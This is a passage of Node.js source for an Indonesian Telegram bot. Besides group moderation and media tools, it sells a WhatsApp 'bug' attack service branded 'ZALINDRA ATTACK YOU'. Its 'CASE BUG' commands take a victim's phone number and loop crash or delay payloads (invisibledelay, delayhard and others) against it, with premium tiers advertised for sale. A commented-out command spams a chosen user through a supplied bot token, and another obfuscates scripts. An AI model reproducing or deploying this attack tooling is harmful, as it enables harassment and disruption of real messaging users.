    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});


bot.command("addadmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addadmin 123");

  if (adminList.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah admin.`);
  }

  addAdmin(userId);
  ctx.reply(`✅ Berhasil tambah ${userId} jadi admin`);
});


bot.command("addprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addprem 123");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`✅ Berhasil tambah ${userId} jadi premium`);
});


bot.command("deladmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /deladmin 123");

  if (!adminList.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di admin.`);
  }

  removeAdmin(userId);
  ctx.reply(`🚫 Berhasil hapus ${userId} dari admin`);
});


bot.command("delprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /delprem 123");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`🚫 Berhasil hapus ${userId} dari premium`);
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});


bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});

bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Group Sudah di Safe");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE Group dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
///// ×××××÷×××××××× ////
bot.command("cmdaktif", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /cmdaktif xkona janggan /xkona");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (!disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah aktif`);
  }

  data.disabled = disabled.filter(c => c !== cmd);
  saveCmdMode(data);

  ctx.reply(`✅ Command /${cmd} berhasil diaktifkan`);
});

bot.command("nonaktifcmd", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const cmd = args[1]?.toLowerCase();

  if (!cmd) return ctx.reply("❌ Contoh: /nonaktifcmd xkona janggan /xkona");

  const data = loadCmdMode();
  const disabled = data?.disabled || [];

  if (disabled.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} sudah nonaktif`);
  }

  disabled.push(cmd);

  data.disabled = disabled;
  saveCmdMode(data);

  ctx.reply(`⛔ Command /${cmd} berhasil dinonaktifkan`);
});
//// Tools ///
/*bot.command("bratvid", async (ctx) => {
  const chatId = ctx.chat.id;

  
  const text = ctx.message.text
    .split(" ")
    .slice(1)
    .join(" ")
    .trim();

  
  if (!text) {
    return ctx.reply(
      "⚠️ Contoh:\n/bratvid woi kontol"
    );
  }

  
  await ctx.reply(
    "🎬 Lagi bikin sticker videonya bre..."
  );

  try {
   
    const res = await fetch(
      `https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(
        text
      )}`
    );

   
    if (!res.ok) {
      throw new Error(
        `HTTP error ${res.status}`
      );
    }

  
    const buffer = Buffer.from(
      await res.arrayBuffer()
    );

  
    const tmpFile = path.join(
      __dirname,
      `bratvid_${Date.now()}.webm`
    );

    fs.writeFileSync(
      tmpFile,
      buffer
    );

  
    await ctx.replyWithSticker(
      {
        source: tmpFile
      }
    );

  
    fs.unlinkSync(
      tmpFile
    );

  } catch (e) {
    console.error(
      "BRATVID ERROR:",
      e
    );

    return ctx.reply(
      "❌ Gagal generate sticker video."
    );
  }
});

bot.command("removebg", async (ctx) => {
  const chatId = ctx.chat.id;

 
  if (
    !ctx.message.reply_to_message ||
    !ctx.message.reply_to_message.photo
  ) {
    return ctx.reply(
      "📸 *Silakan reply foto yang ingin dihapus background-nya.*",
      {
        parse_mode: "Markdown"
      }
    );
  }

  try {
    await ctx.reply("⏳ Sedang menghapus background...");

   
    const photo =
      ctx.message.reply_to_message.photo[
        ctx.message.reply_to_message.photo.length - 1
      ];

  
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

   
    const imageResponse = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

  
    const formData = new FormData();
    formData.append("size", "auto");
    formData.append(
      "image_file",
      Buffer.from(imageResponse.data),
      "image.jpg"
    );

  
    const response = await axios.post(
      "https://api.remove.bg/v1.0/removebg",
      formData,
      {
        headers: {
          ...formData.getHeaders(),
          "X-Api-Key": REMOVE_BG_KEY
        },
        responseType: "arraybuffer"
      }
    );

   
    const filePath = `./removebg_${chatId}.png`;
    fs.writeFileSync(filePath, response.data);

   
    await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption: "✨ Background berhasil dihapus!"
      }
    );

  
    fs.unlinkSync(filePath);

  } catch (error) {
    console.error(
      "REMOVEBG ERROR:",
      error.response?.data?.toString() || error.message
    );

    return ctx.reply(
      `❌ Gagal remove background:\n${
        error.response?.data?.toString() || error.message
      }`
    );
  }
});

bot.command("livejam", async (ctx) => {
  const chatId = ctx.chat.id;


  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
  }

  const msg = await ctx.reply(getTimeIndonesia());

  liveIntervals[chatId] = setInterval(async () => {
    try {
      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        null,
        getTimeIndonesia()
      );
    } catch (e) {
      clearInterval(liveIntervals[chatId]);
      delete liveIntervals[chatId];
    }
  }, 3000); 
});

bot.command("stopjam", (ctx) => {
  const chatId = ctx.chat.id;

  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
    delete liveIntervals[chatId];
    ctx.reply("⛔ Live clock dihentikan");
  } else {
    ctx.reply("❌ Tidak ada live clock yang aktif");
  }
});

bot.command("listharga", (ctx) => {
  ctx.reply(`
<pre>💰 LIST HARGA TITLE ATOMIC

━━━━━━━━━━━━━━━
5K NO UPDATE
10K FULL UPADATE 
15K RESELLER SC 
25K PATNER SC
35K OWNER SC
45K MODERATOR SC
━━━━━━━━━━━━━━━
Order: @pacenicwlee
</pre>`, { parse_mode: "HTML" });
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Atomic Crashers ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("enc", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;

    if (!reply || !reply.document) {
      return ctx.reply("❌ Reply file .js dengan command /enc");
    }

    const doc = reply.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus JavaScript (.js)");
    }

    const file = await ctx.telegram.getFile(doc.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    const res = await axios.get(fileUrl);
    let code = res.data;

    if (!code || code.length < 5) {
      return ctx.reply("❌ File kosong / tidak valid");
    }

    await ctx.reply("🔐 Encrypt aman sedang berjalan...");

  
    code = `/ Protected Script - ${ctx.from.first_name} /\n` + code;

    const obf = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      controlFlowFlattening: false,
      deadCodeInjection: false,
      debugProtection: false,
      disableConsoleOutput: true,
      stringArray: true,
      stringArrayEncoding: ["base64"],
      stringArrayThreshold: 0.75,
      stringArrayShuffle: true,
      splitStrings: true,
      splitStringsChunkLength: 5
    });

    const result = obf.getObfuscatedCode();

    await ctx.replyWithDocument({
      source: Buffer.from(result, "utf8"),
      filename: "enc_safe.js"
    }, {
      caption: "✅ Encrypt berhasil (reply mode)\n🔒 Stabil & Aman"
    });

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal encrypt");
  }
});

bot.command("rasukbot", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  if (!args) {
    return ctx.reply(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    if (reply) {
      const parts = args.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return ctx.reply(
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {

      if (!args.includes("|")) {
        return ctx.reply(
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = args.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.reply(
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.reply(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.reply(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
});/**/

bot.command("cekid", async (ctx) => {
  try {
    let target = ctx.from;

   
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id;
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const username = target.username ? `@${target.username}` : "Tidak ada username";
    const fullName = `${firstName} ${lastName}`.trim();

    const teks = `
<blockquote><strong>「 CEK USER ID 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💬 Chat ID: <code>${ctx.chat.id}</code>
    `;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKID ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek ID\n${e.message}`
    );
  }
});
/// Connect ////
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Restart bot dulu.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://h.uguu.se/efToQTeR.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`<pre>⬡═―⊱「 𝐙𝐀𝐋𝐈𝐍𝐃𝐑𝐀 𝐈𝐍𝐕𝐋𝐀𝐒𝐈𝐎𝐍 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ  Nomor  : ${phoneNumber}
ϟ  Kode   : ${formattedCode}
ϟ  Note  : KALO GAGAL PAIR HAPUS SENSASION 

ϟ  🟡 Status : Waiting for connection...
</pre>`,
        parse_mode: "HTML"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing!");
  }
});

/// ------ Kill Sesi -------- ///
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session dihapus, silakan /connect ulang");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session");
  }
});
/// CASE BUG ///
bot.command("locksc", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /locksc 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 7; i++) {
      await invisibledelay(sock, target);
    }
  })();

});
/// CASE BUG ///
bot.command("xkona", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /xkona 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 7; i++) {
      await DelayStatus(sock, target);
      await sleep(10);
    }
  })();

});
/// CASE BUG ///
bot.command("Xvlod", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /Xvlod 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "☛ CEK TARGET ☚",
              url: `https://wa.me/${cleanNumber}`,
              style: "success",
              icon_custom_emoji_id: "4958642964181025908"
            }
          ],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 140; i++) {
      await delayhard(sock, target);
      await sleep(1000);
    }
  })();

});
/// CASE BUG ///
bot.command("Xcombo", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /Xcombo 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /Xcombo 
